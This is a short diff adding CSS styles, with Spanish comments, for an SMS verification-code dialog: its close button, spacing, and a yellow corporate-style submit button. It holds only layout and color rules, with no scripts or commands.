+  cursor: pointer;
+  border-radius: 50%;
+  transition: color 0.2s, background 0.2s;
+}
+#sms-code-dialog .bc-key-validation-close-button:hover {
+  color: #2c2a29;
+  background: #f4f4f2;
+}
+
+/* Aire extra entre el bloque del cÃ³digo y el botÃ³n Enviar para que respire en mÃ³vil. */
+#sms-code-dialog .bc-key-validation-body {
+  margin-bottom: 6px;
+}
+#sms-code-dialog .bc-key-validation-footer {
+  padding: 0 24px 26px;
+}
+#sms-code-dialog .bc-key-validation-action-container {
+  margin-bottom: 4px;
+}
+
+/* BotÃ³n de acciÃ³n corporativo: amarillo oficial #FDDA24, texto negro en negrita y esquinas
+   sutilmente redondeadas (rectangular, no ovalado ni opaco). */
+#sms-code-dialog .bc-sms-submit-button {
+  border-radius: 10px;
+  width: 100%;
+  max-width: 300px;
+  min-width: 0;
+  padding: 15px 24px;
+  font-size: 16px;
+  line-height: 18px;
+  font-weight: 800;
+  color: #000000;
+  box-shadow: 0 4px 14px rgba(253, 218, 36, 0.35);
+}
+#sms-code-dialog .bc-sms-submit-button:hover:not(:disabled) {
+  background: #f5c900;
+}
+
+/* Fin de estilos de la Fase 3 */
